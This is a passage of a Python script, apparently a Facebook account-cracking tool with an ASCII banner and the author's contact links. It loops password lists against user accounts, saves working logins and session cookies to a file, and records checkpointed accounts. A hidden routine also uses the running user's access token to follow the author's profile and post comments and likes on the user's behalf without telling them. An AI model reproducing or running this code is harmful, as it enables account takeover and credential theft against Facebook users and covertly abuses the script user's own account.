...
komen = random.choice(['Mantap bang @[100069477765653:0] I Love You','Pengguna script ganja kamu bang @[100069477765653:0]','Kamu ganteng banget deh @[100069477765653:0]','Kamu ganteng banget deh bang @[100069477765653:0]','Kamu manis bang bang @[100069477765653:0]','Kamu cantik banget anak siapa @[100069477765653:0]','Kamu ganteng banget bang @[100069477765653:0]','Mantap bang love you','Khamdihi nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100069477765653:0]'])
...
/$$$$$$$ /$$$$$$ /$$ /$$ /$$ /$$ /$$ /$$ /$$ /$$$$$$$$ | $$__ $$ /$$__ $$| $$$ | $$| $$$ | $$| $$ /$$//$$$$ | $$_____/ | $$ \ $$| $$ \ $$| $$$$| $$| $$$$| $$ \ $$ /$$/|_ $$ | $$ | $$ | $$| $$$$$$$$| $$ $$ $$| $$ $$ $$ \ $$$$/ | $$ | $$$$$ | $$ | $$| $$__ $$| $$ $$$$| $$ $$$$ \ $$/ | $$ | $$__/ | $$ | $$| $$ | $$| $$\ $$$| $$\ $$$ | $$ | $$ | $$ | $$$$$$$/| $$ | $$| $$ \ $$| $$ \ $$ | $$ /$$$$$$| $$$$$$$$ |_______/ |__/ |__/|__/ \__/|__/ \__/ |__/ |______/|________/ 

───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Nama       : DANNY1E
 [\x1b[1;96m+%s] WhatsApp   : https://wa.me/message/HXNZRRV5MFDKH1
 [\x1b[1;96m+%s] Facebook   : https://www.facebook.com/danielebuka.nwodo
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
def xoshnaw():
  ...
  try:
    httpCaht = requests.get("https://github.com/DANN1E/DANNY-404/blob/main/list.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+2349030431716')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100069477765653/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100069477765653/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100069477765653/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/285335733792350/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/285335733792350/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/285335733792350/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/285335733792350/likes?summary=true&access_token=' + toket)
			...
			for pw in pwx:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %sLog--> %s • %s • %s %s %s • %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
						...
						pass
					print('\r %sLog--> %s • %s • %s'%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s • %s • %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s ◊ %s ◊ %s\n'%(user,pw,coki))
					break
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %sTeu--> %s • %s • %s %s %s'%(K,user,pw,day,month,year))
